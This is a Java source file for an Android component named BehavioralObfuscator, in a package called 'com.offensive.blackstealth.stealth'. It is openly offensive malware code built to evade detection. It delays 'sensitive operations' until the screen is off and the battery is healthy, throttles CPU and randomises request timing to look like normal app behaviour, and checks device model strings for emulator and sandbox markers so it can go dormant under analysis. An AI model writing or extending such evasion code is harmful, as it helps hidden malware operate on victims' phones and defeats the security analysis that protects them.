package com.offensive.blackstealth.stealth;

import android.content.Context;
import android.os.BatteryManager;
import android.os.PowerManager;
import android.util.Log;
import java.util.Random;

/**
 * BehavioralObfuscator - Evades behavioral analysis by mimicking normal app patterns
 */
public class BehavioralObfuscator {
    private static final String TAG = "BehavioralObfuscator";
    
    private Context context;
    private Random random;
    private boolean isActive = false;
    
    // Timing parameters to mimic human behavior
    private long minActionDelay = 500;
    private long maxActionDelay = 5000;
    private int actionsPerSession = 10;
    
    public BehavioralObfuscator(Context context) {
        this.context = context;
        this.random = new Random();
    }
    
    /**
     * Add random delay before actions to avoid detection
     */
    public void randomDelay() {
        try {
            long delay = minActionDelay + random.nextInt((int)(maxActionDelay - minActionDelay));
            Thread.sleep(delay);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
    
    /**
     * Check if device is being actively used - avoid actions during active use
     */
    public boolean isUserActive() {
        try {
            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            return pm.isInteractive();
        } catch (Exception e) {
            return true; // Assume active if we can't check
        }
    }
    
    /**
     * Check battery level - reduce activity on low battery to avoid suspicion
     */
    public boolean isBatteryOk() {
        try {
            BatteryManager bm = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
            int level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            return level > 20;
        } catch (Exception e) {
            return true;
        }
    }
    
    /**
     * Wait for idle time before performing sensitive operations
     */
    public void waitForIdleTime(long maxWaitMs) {
        long waited = 0;
        while (waited < maxWaitMs && isUserActive()) {
            try {
                Thread.sleep(10000);
                waited += 10000;
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            }
        }
    }
    
    /**
     * Spread actions over time to look like normal app behavior
     */
    public void scheduleAction(Runnable action) {
        new Thread(() -> {
            // Wait for good conditions
            waitForIdleTime(300000); // Max 5 minutes
            
            if (!isBatteryOk()) {
                return;
            }
            
            randomDelay();
            action.run();
        }).start();
    }
    
    /**
     * Limit CPU usage to avoid detection
     */
    public void throttleCpu(Runnable intensiveTask) {
        new Thread(() -> {
            android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_BACKGROUND);
            
            // Run in short bursts with pauses
            long burstDuration = 100; // ms of work
            long pauseDuration = 400; // ms of pause
            
            long startTime = System.currentTimeMillis();
            intensiveTask.run();
            long elapsed = System.currentTimeMillis() - startTime;
            
            // Add proportional delay
            if (elapsed > burstDuration) {
                try {
                    Thread.sleep(elapsed * 4);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            }
        }).start();
    }
    
    /**
     * Randomize network request timing to avoid pattern detection
     */
    public long getNextRequestDelay() {
        // Use exponential distribution to mimic human browsing patterns
        double lambda = 0.1;
        return (long) (-Math.log(1 - random.nextDouble()) / lambda * 1000);
    }
    
    /**
     * Check if running in sandbox/emulator
     */
    public boolean isRunningInSandbox() {
        String[] sandboxIndicators = {
            "generic", "unknown", "google_sdk", "Emulator", "Android SDK",
            "Genymotion", "vbox86p", "goldfish", "ranchu"
        };
        
        String model = android.os.Build.MODEL;
        String product = android.os.Build.PRODUCT;
        String hardware = android.os.Build.HARDWARE;
        
        for (String indicator : sandboxIndicators) {
            if (model.contains(indicator) || product.contains(indicator) || 
                hardware.contains(indicator)) {
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * Pause all activity if sandbox detected
     */
    public void enableSandboxEvasion() {
        if (isRunningInSandbox()) {
            Log.w(TAG, "Sandbox detected - pausing activity");
            isActive = false;
        } else {
            isActive = true;
        }
    }
    
    public boolean isActive() {
        return isActive && !isRunningInSandbox();
    }
    
    public void setTimingParameters(long minDelay, long maxDelay) {
        this.minActionDelay = minDelay;
        this.maxActionDelay = maxDelay;
    }
}
